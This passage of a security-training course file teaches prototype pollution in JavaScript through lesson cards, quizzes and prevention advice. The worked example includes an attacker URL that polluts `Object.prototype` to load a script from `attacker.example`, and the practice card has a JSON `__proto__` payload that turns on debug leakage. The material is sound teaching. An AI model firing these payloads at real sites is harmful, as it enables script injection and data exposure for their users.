          "Step 3 \u2014 find the gadget: locate the analytics library's code that does `var options = window.config || {}; if (options.transport_url) { loadScript(options.transport_url); }`. Because `window.config` likely does NOT have its own `transport_url` property, the property lookup falls through to the now-polluted `Object.prototype`, so `options.transport_url` resolves to the attacker's URL even though nobody ever explicitly set it on `window.config`.",
          "Step 4 \u2014 observe the impact: the analytics library, trusting its own config lookup, dynamically injects a `<script src=\"//attacker.example/evil.js\">` tag into the page \u2014 full attacker-controlled JavaScript now runs in the context of shop.example, exactly like a DOM XSS, even though no HTML was directly injected anywhere.",
          "WHY each step matters: step 1 locates the actual attacker-reachable entry point (the source); step 2 proves the pollution really happened before chasing further; step 3 is the critical insight that pollution alone does nothing until some EXISTING piece of code (the gadget) trusts a property that silently resolved from the prototype; step 4 confirms the end-to-end impact is genuine script execution, not just a changed property value.",
        ],
        code: `// Attacker-crafted URL:
// https://shop.example/?__proto__[transport_url]=//attacker.example/evil.js

// Vulnerable analytics library code (the GADGET):
var options = window.config || {};
if (options.transport_url) {
  var s = document.createElement('script');
  s.src = options.transport_url;
  document.head.appendChild(s);
}`,
        tone: "offense",
        check: {
          type: "order",
          q: "Order the source-to-sink chain in this DOM XSS via prototype pollution example.",
          items: [
            "Attacker-controlled query string is parsed into a nested object containing a __proto__ key (the source)",
            "An unsafe recursive merge writes transport_url onto the shared Object.prototype",
            "Unrelated analytics code reads options.transport_url, which resolves via the polluted prototype (the gadget)",
            "The analytics code loads and executes a script from the attacker's URL (the sink)",
          ],
          explain: "Prototype pollution alone changes no visible behaviour until some existing 'gadget' trusts a property that silently resolves from the shared prototype and feeds it into a dangerous sink like dynamic script loading.",
          hints: ["Source is where attacker input enters.", "Gadget is existing code that TRUSTS a property without knowing it came from the prototype.", "Sink is the dangerous operation performed with that value."],
          ref: "Worked example: from pollution to DOM XSS via a gadget",
        },
      },
      {
        title: "Finding pollution sources and preventing it",
        kind: "explain",
        body: [
          "To find candidate sources, look for any code that parses attacker-controlled input (URL query strings, JSON request bodies, form data) into nested objects and then passes that parsed object into a generic merge/clone/extend/deepAssign utility function, especially older or custom-written utilities rather than well-maintained, patched libraries.",
          "A quick manual test: submit `__proto__[somekey]=somevalue` (as a query param or JSON body field) and then, in the browser console or server logs, check whether `({}).somekey` now equals `somevalue` \u2014 if so, the merge is vulnerable.",
          "Prevention techniques: use `Object.create(null)` to create objects with NO prototype at all (so there's nothing to pollute via inheritance); use `Map` instead of plain objects for storing arbitrary user-supplied keys (Map keys never interact with the prototype chain); or explicitly reject/skip the keys `__proto__`, `constructor`, and `prototype` inside any custom recursive merge function.",
        ],
        tone: "defense",
      },
      {
        title: "Common mistakes",
        kind: "mistakes",
        body: [
          "Mistake: treating 'I proved `{}.somekey` changed' as proof of a critical vulnerability on its own. Pollution is only as dangerous as the GADGET that later trusts the polluted property \u2014 you must find (or at least plausibly identify) an actual sink that reads that property before claiming impact like XSS or privilege escalation.",
          "Mistake: only checking `__proto__` and forgetting `constructor.prototype`, which reaches the exact same shared prototype object via a different path (`obj.constructor.prototype === Object.prototype` for plain objects) and can bypass a naive filter that only blocks the literal string `__proto__`.",
          "Mistake: assuming server-side and client-side prototype pollution have the same impact. Server-side pollution in Node.js can sometimes be escalated further (e.g. to denial of service, or in some library-specific gadget chains, even remote code execution), while client-side pollution's typical ceiling is DOM XSS \u2014 the root cause is identical, but the available gadgets and resulting severity differ by environment.",
        ],
      },
      {
        title: "Guided practice",
        kind: "practice",
        body: [
          "A Node.js app merges `req.body` into its internal settings object using the same unsafe recursive merge shown earlier, with no key filtering. Elsewhere, when rendering a page, the app does: `const isDebugMode = settingsObject.debug || false; if (isDebugMode) { res.send(fullStackTraceForEveryError); }`. An attacker sends a JSON body of `{\"__proto__\":{\"debug\":true}}` to an unrelated endpoint that triggers this merge. What happens the next time ANY user triggers an error, anywhere in the app?",
        ],
        check: {
          type: "fill",
          q: "Fill in the missing key name: to prevent this specific class of bug, a safe recursive merge function must explicitly skip/reject the key named '____' (among others like constructor and prototype).",
          answers: ["__proto__"],
          explain: "Without explicitly excluding the literal key __proto__ (and constructor/prototype), a recursive merge will treat it like any other key and end up writing onto the shared Object.prototype, exactly as in this scenario \u2014 causing debug mode (and the resulting stack-trace leakage) to silently turn on for every single user's error, not just the attacker's own request.",
          hints: ["It's the special accessor property most objects expose for their prototype link.", "Two leading and two trailing underscores."],
          ref: "Finding pollution sources and preventing it",
        },
      },
      {
        title: "Practical relevance: what a pollution finding proves and does not prove",
        kind: "relevance",
        body: [
          "Proving that `({}).somekey` changes after submitting a crafted `__proto__` payload proves the merge function is exploitable and that you've achieved prototype pollution \u2014 a real finding worth reporting even on its own, since it indicates unsafe input handling.",
          "It does NOT by itself prove a specific severe impact like XSS, privilege escalation, or RCE \u2014 you must separately identify an actual gadget (existing code that trusts the polluted property) and demonstrate the full source-to-gadget-to-sink chain before claiming that higher severity in a report.",
          "Only test prototype pollution payloads against endpoints and features within your authorised scope, and be cautious that polluting a SHARED prototype in a live server process can affect that process's behaviour for OTHER concurrent users until the process restarts \u2014 prefer testing in a disposable/staging environment when attempting anything beyond the minimal confirmation payload.",
        ],
      },
    ],
    exercises: [
      {
        type: "mc",
        q: "Which property is most commonly used to reach the shared Object.prototype from a plain object?",
        options: ["__proto__", "__parent__", "prototype", "__base__"],
        answer: 0,
        why: [
          "Correct \u2014 __proto__ is the standard accessor property most engines expose, linking an object to its prototype.",
          "__parent__ is not a real JavaScript property.",
          "`prototype` exists on FUNCTIONS (as the object that becomes instances' prototype), not as an accessor on plain object instances themselves.",
          "__base__ is not a real JavaScript property.",
        ],
        explain: "The __proto__ property is a reference to the object's prototype, and polluting it affects all objects inheriting from that prototype, since for a plain {} it points directly at the shared Object.prototype.",
        hints: [
          "It starts and ends with double underscores.",
          "It's the standard way to access an object's prototype link in JS.",
        ],
        ref: "Prerequisites: __proto__, merge functions, and recursive key assignment",
      },
      {
        type: "fill",
        q: "To prevent prototype pollution, you can create an object that doesn't inherit from anything using Object.create(____).",
        answers: ["null"],
        explain: "Object.create(null) creates a 'prototype-less' object with no inherited properties at all, making it immune to pollution via inheritance since there's no prototype chain to fall through to.",
        hints: [
          "What keyword represents 'nothing' in JavaScript?",
          "It's not undefined.",
        ],
        ref: "Finding pollution sources and preventing it",
      },
      {
        type: "mc",
        q: "Why is checking only for the literal key `__proto__` an incomplete defence against prototype pollution?",
        options: [
          "It's actually a complete defence on its own",
          "Because `constructor.prototype` reaches the same shared Object.prototype through a different property path",
          "Because __proto__ is deprecated and no longer works in any browser",
          "Because prototype pollution only happens server-side, never in browsers",
        ],
        answer: 1,
        why: [
          "A filter on only the literal string __proto__ can still be bypassed by an equivalent path.",
          "Correct \u2014 obj.constructor.prototype resolves to the same Object.prototype for plain objects, giving attackers an alternate key path that a __proto__-only filter misses.",
          "__proto__ remains widely supported across engines, and even where it weren't, constructor.prototype provides an equivalent path.",
          "Prototype pollution affects any JavaScript engine, client or server-side, wherever an unsafe recursive merge processes attacker-controlled keys.",
        ],
        explain: "A robust filter must reject __proto__, constructor, and prototype as key names, since each can be used, alone or combined, to reach and modify the shared Object.prototype.",
        hints: ["Is there more than one property path that leads to the same shared prototype object?", "Recall the common-mistakes card's point about constructor.prototype."],
        ref: "Common mistakes",
      },
      {
        type: "match",
        q: "Match the prototype pollution chain stage to its description.",
        pairs: [
          ["Source", "The point where attacker-controlled input enters the application, e.g. a URL or JSON body"],
          ["Sink", "A dangerous operation, like dynamic script loading or rendering debug output, performed using the polluted property"],
          ["Gadget", "Existing, otherwise-unrelated code that trusts a property which silently resolved from the prototype"],
          ["Pollution", "The act of writing an attacker-chosen property directly onto the shared Object.prototype"],
        ],
        explain: "Understanding the flow from source to pollution to gadget to sink is key to identifying and demonstrating real impact from this bug class, rather than stopping at the pollution step alone.",
        hints: [
          "Source is the start of the data flow.",
          "Sink is the dangerous end of the data flow.",
          "Gadget is the pre-existing code that connects pollution to the sink.",
        ],
        ref: "Worked example: from pollution to DOM XSS via a gadget",
      },
      {
        type: "order",
        q: "Order the generic steps to responsibly confirm and demonstrate impact from a suspected prototype pollution bug.",
        items: [
          "Find a recursive merge/clone function that processes attacker-controlled input without filtering dangerous keys",
          "Submit a minimal __proto__ payload and confirm a fresh {} object now carries the polluted property",
          "Search the application for a gadget that reads that same property name and uses it in a dangerous way",
          "Demonstrate the full chain end-to-end (e.g. script execution or leaked debug output) within authorised scope",
        ],
        explain: "Confirmation of the raw pollution should always come before searching for a gadget and demonstrating full impact, to avoid overclaiming severity based on the pollution step alone.",
        hints: ["Prove the write lands on the shared prototype before hunting for what might use it.", "Full impact requires finding a specific gadget, not just confirming pollution."],
        ref: "Finding pollution sources and preventing it",
      },
    ],
  },
];
